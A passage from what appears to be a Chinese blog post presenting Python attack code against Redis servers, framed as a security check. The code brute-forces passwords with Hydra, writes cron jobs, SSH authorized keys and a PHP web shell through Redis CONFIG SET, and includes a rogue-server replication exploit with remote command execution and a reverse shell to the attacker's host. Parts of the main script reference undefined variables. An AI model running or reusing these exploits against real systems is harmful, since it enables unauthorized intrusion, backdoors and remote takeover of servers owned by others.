passwords<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_redis_password</span>(<span class="hljs-params">host, password_file</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    使用Hydra进行Redis密码爆破。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> password_file <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[ERROR] 未提供Hydra密码文件路径&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    command = [<br>        <span class="hljs-string">&quot;hydra&quot;</span>,<br>        host,<br>        <span class="hljs-string">&quot;redis&quot;</span>,<br>        <span class="hljs-string">&quot;-P&quot;</span>,<br>        password_file,<br>        <span class="hljs-string">&quot;-e&quot;</span>,<br>        <span class="hljs-string">&quot;ns&quot;</span>,<br>        <span class="hljs-string">&quot;-f&quot;</span>,<br>        <span class="hljs-string">&quot;-o&quot;</span>,<br>        <span class="hljs-string">&quot;redis.txt&quot;</span>,<br>    ]<br>    <span class="hljs-keyword">try</span>:<br>        subprocess.run(command, check=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;redis.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            lines = f.readlines()<br>            <span class="hljs-keyword">if</span> lines:<br>                <span class="hljs-keyword">pass</span><br>                <span class="hljs-comment"># print(&quot;[WARNING] Hydra密码破解成功！发现弱密码，请加强密码安全！&quot;)</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码破解未找到有效密码&quot;</span>)<br>    <span class="hljs-keyword">except</span> subprocess.CalledProcessError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] 运行Hydra时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_redis_rce</span>(<span class="hljs-params">rhost, lhost, exp_file, auth</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    测试Redis是否易受RCE攻击。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    command = <span class="hljs-string">f&quot;python3 /home/kali/workfeild/rce.py -r <span class="hljs-subst">&#123;rhost&#125;</span> -L <span class="hljs-subst">&#123;lhost&#125;</span> -f <span class="hljs-subst">&#123;exp_file&#125;</span> -a <span class="hljs-subst">&#123;auth&#125;</span>&quot;</span><br>    process = subprocess.run(command, shell=<span class="hljs-literal">True</span>, capture_output=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Exploit Success!&quot;</span> <span class="hljs-keyword">in</span> process.stdout.decode():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] Redis RCE 攻击成功： <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[INFO] Redis RCE攻击失败： <span class="hljs-subst">&#123;command&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_cron_getshell</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入计划任务</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\n* * * * 1  date&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/var/spool/cron&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入计划任务命令已成功执行！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入计划任务命令执行失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_sshkeygen</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入ssh-keygen</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\nid_rsa.pub\n\n&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/root/.ssh&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;test_authorized_keys&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 成功写入ssh公钥！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 写入ssh公钥失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_web_getshell</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    利用 Redis 写入网站绝对路径</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 使用 StrictRedis 连接</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br><br>        <span class="hljs-comment"># 设置 cron 键</span><br>        result = client.execute_command(<br>            <span class="hljs-string">&quot;FLUSHALL&quot;</span>,<br>        )<br>        result = client.<span class="hljs-built_in">set</span>(<span class="hljs-string">&quot;cron&quot;</span>, <span class="hljs-string">&quot;\n\nphp\n\n&quot;</span>)<br><br>        <span class="hljs-comment"># 设置配置文件目录</span><br>        result = client.config_set(<span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;/var/www/html/&quot;</span>)<br><br>        <span class="hljs-comment"># 设置数据库文件名</span><br>        result = client.config_set(<span class="hljs-string">&quot;dbfilename&quot;</span>, <span class="hljs-string">&quot;shell.php.test&quot;</span>)<br><br>        <span class="hljs-comment"># 保存配置</span><br>        result = client.save()<br><br>        <span class="hljs-comment"># 判断命令是否成功执行并输出提示</span><br>        <span class="hljs-keyword">if</span> result == <span class="hljs-literal">True</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 网站目录写入php漏洞脚本成功！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Redis 网站目录写入php漏洞脚本失败！&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Redis 配置失败：<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_redis_security</span>(<span class="hljs-params"></span><br><span class="hljs-params">    host=<span class="hljs-string">&quot;localhost&quot;</span>, port=<span class="hljs-number">6379</span>, password=<span class="hljs-literal">None</span>, password_file=<span class="hljs-literal">None</span></span><br><span class="hljs-params"></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    检查Redis服务器的安全性。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 尝试连接到Redis服务器</span><br>    passwordlist = [<span class="hljs-string">&quot;password&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_redis_connection(host, port, password):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 无法连接到Redis服务器，尝试使用Hydra进行暴力破解&quot;</span>)<br>        brute_force_redis_password(host, password_file)<br>        passwordlist = extract_passwords(<span class="hljs-string">&quot;/home/kali/workfeild/redis.txt&quot;</span>)<br>        <span class="hljs-keyword">if</span> passwordlist != []:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码爆破成功&quot;</span>)<br>            password = passwordlist[-<span class="hljs-number">1</span>]<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;破解的密码: <span class="hljs-subst">&#123;password&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] Hydra密码爆破失败&quot;</span>)<br>            <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 检查是否设置了密码</span><br>        <span class="hljs-keyword">if</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> passwordlist == []:<br>            <span class="hljs-built_in">print</span>(<br>                <span class="hljs-string">&quot;[INFO] 设置了密码，尝试使用Hydra进行暴力破解失败，若需要进一步测试可手动输入密码&quot;</span><br>            )<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">elif</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 未设置密码&quot;</span>)<br>        <span class="hljs-comment"># 获取Redis信息</span><br>        client = redis.StrictRedis(<br>            host=host, port=port, password=password, decode_responses=<span class="hljs-literal">True</span><br>        )<br>        <span class="hljs-comment"># info = client.info()</span><br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否响应PING命令&quot;)</span><br>        <span class="hljs-comment"># if client.ping():</span><br>        <span class="hljs-comment">#     print(&quot;[INFO] Redis服务器可以访问且响应PING命令&quot;)</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入ssh公钥&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_sshkeygen(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis成功篡改ssh公钥&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis篡改ssh公钥&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_web_getshell(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis写入php漏洞脚本getshell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以写入cron漏洞脚本&quot;</span>)<br>        <span class="hljs-keyword">if</span> write_cron_getshell(host, port, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 通过Redis服务器写入一个计划任务反弹shell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法通过Redis服务器写入计划任务反弹shell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[INFO] 测试Redis服务器是否可以利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-keyword">if</span> test_redis_rce(host, lhost, exp_file, password):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[FATAL] 成功利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[DONE] 无法利用Redis主从复制GetShell&quot;</span>)<br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否开启protected-mode&quot;)</span><br>        <span class="hljs-comment"># if client.config_get(&quot;protected-mode&quot;)[1] == &quot;yes&quot;:</span><br>        <span class="hljs-comment">#     print(&quot;[DONE] Redis服务器开启protected-mode&quot;)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     print(&quot;[FATAL] Redis服务器未开启protected-mode&quot;)</span><br><br>        <span class="hljs-comment"># print(&quot;[INFO] 测试Redis服务器是否绑定特定IP地址&quot;)</span><br>        <span class="hljs-comment"># if client.config_get(&quot;bind&quot;)[1] == &quot;&quot;:</span><br>        <span class="hljs-comment">#     print(&quot;[INFO] Redis服务器未绑定特定IP地址&quot;)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     print(f&quot;[DONE] Redis服务器绑定IP地址：&#123;client.config_get(&#x27;bind&#x27;)[1]&#125;&quot;)</span><br><br>    <span class="hljs-keyword">except</span> redis.exceptions.ResponseError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[ERROR] Redis响应错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&quot;检查Redis的安全性&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--host&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器地址&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--port&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>, default=<span class="hljs-number">6379</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器端口&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&quot;--password&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Redis服务器密码&quot;</span>)<br><br>    args = parser.parse_args()<br><br>    <span class="hljs-comment"># 进行安全检查</span><br>    check_redis_security(<br>        host=args.host,<br>        port=args.port,<br>        password=args.password,<br>        password_file=password_file,<br>    )<br><br></code></pre></td></tr></table></figure><p>rce.py</p><p>基于GitHub开源代码修改<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>CLRF = <span class="hljs-string">&quot;\r\n&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_cmd_arr</span>(<span class="hljs-params">arr</span>):<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(arr))<br>    <span class="hljs-keyword">for</span> arg <span class="hljs-keyword">in</span> arr:<br>        cmd += CLRF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(arg))<br>        cmd += CLRF + arg<br>    cmd += <span class="hljs-string">&quot;\r\n&quot;</span><br>    <span class="hljs-keyword">return</span> cmd<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_cmd</span>(<span class="hljs-params">raw_cmd</span>):<br>    <span class="hljs-keyword">return</span> mk_cmd_arr(raw_cmd.split(<span class="hljs-string">&quot; &quot;</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">din</span>(<span class="hljs-params">sock, cnt</span>):<br>    msg = sock.recv(cnt)<br>    <span class="hljs-keyword">return</span> msg.decode()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dout</span>(<span class="hljs-params">sock, msg</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(msg) != <span class="hljs-built_in">bytes</span>:<br>        msg = msg.encode()<br>    sock.send(msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_shell_result</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;\n&quot;</span>.join(s.split(<span class="hljs-string">&quot;\r\n&quot;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Remote</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, rhost, rport</span>):<br>        self._host = rhost<br>        self._port = rport<br>        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self._sock.connect((self._host, self._port))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg</span>):<br>        dout(self._sock, msg)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self, cnt=<span class="hljs-number">65535</span></span>):<br>        <span class="hljs-keyword">return</span> din(self._sock, cnt)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do</span>(<span class="hljs-params">self, cmd</span>):<br>        self.send(mk_cmd(cmd))<br>        buf = self.recv()<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        self._sock.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">shell_cmd</span>(<span class="hljs-params">self, cmd</span>):<br>        self.send(mk_cmd_arr([<span class="hljs-string">&#x27;system.exec&#x27;</span>, <span class="hljs-string">&quot;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(cmd)]))<br>        buf = self.recv()<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_shell</span>(<span class="hljs-params">self, addr, port</span>):<br>        self.send(mk_cmd(<span class="hljs-string">&quot;system.rev &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr, port)))<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RogueServer</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, lhost, lport, remote, file</span>):<br>        self._host = lhost<br>        self._port = lport<br>        self._remote = remote<br>        self._file = file<br>        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self._sock.bind((<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, self._port))<br>        self._sock.settimeout(<span class="hljs-number">15</span>)<br>        self._sock.listen(<span class="hljs-number">10</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self, data</span>):<br>        resp = <span class="hljs-string">&quot;&quot;</span><br>        phase = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">if</span> data.find(<span class="hljs-string">&quot;PING&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+PONG&quot;</span> + CLRF<br>            phase = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;REPLCONF&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+OK&quot;</span> + CLRF<br>            phase = <span class="hljs-number">2</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;AUTH&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+OK&quot;</span> + CLRF<br>            phase = <span class="hljs-number">3</span><br>        <span class="hljs-keyword">elif</span> data.find(<span class="hljs-string">&quot;PSYNC&quot;</span>) &gt; -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> data.find(<span class="hljs-string">&quot;SYNC&quot;</span>) &gt; -<span class="hljs-number">1</span>:<br>            resp = <span class="hljs-string">&quot;+FULLRESYNC &quot;</span> + <span class="hljs-string">&quot;Z&quot;</span> * <span class="hljs-number">40</span> + <span class="hljs-string">&quot; 0&quot;</span> + CLRF<br>            resp += <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)) + CLRF<br>            resp = resp.encode()<br>            resp += payload + CLRF.encode()<br>            phase = <span class="hljs-number">4</span><br>        <span class="hljs-keyword">return</span> resp, phase<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        self._sock.close()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            cli, addr = self._sock.accept()<br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                data = din(cli, <span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">break</span><br>                resp, phase = self.handle(data)<br>                dout(cli, resp)<br>                <span class="hljs-keyword">if</span> phase == <span class="hljs-number">4</span>:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanup</span>(<span class="hljs-params">remote, expfile</span>):<br>    remote.do(<span class="hljs-string">&quot;CONFIG SET dbfilename dump.rdb&quot;</span>)<br>    remote.shell_cmd(<span class="hljs-string">&quot;rm ./&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(expfile))<br>    remote.do(<span class="hljs-string">&quot;MODULE UNLOAD system&quot;</span>)<br>    remote.close()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit_redis</span>(<span class="hljs-params">rhost, rport, lhost, lport, exp_file, auth=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">global</span> payload<br>    expfile = os.path.basename(exp_file)<br>    payload = <span class="hljs-built_in">open</span>(exp_file, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>    <span class="hljs-keyword">try</span>:<br>        remote = Remote(rhost, rport)<br>        <span class="hljs-keyword">if</span> auth:<br>            check = remote.do(<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(auth))<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;invalid 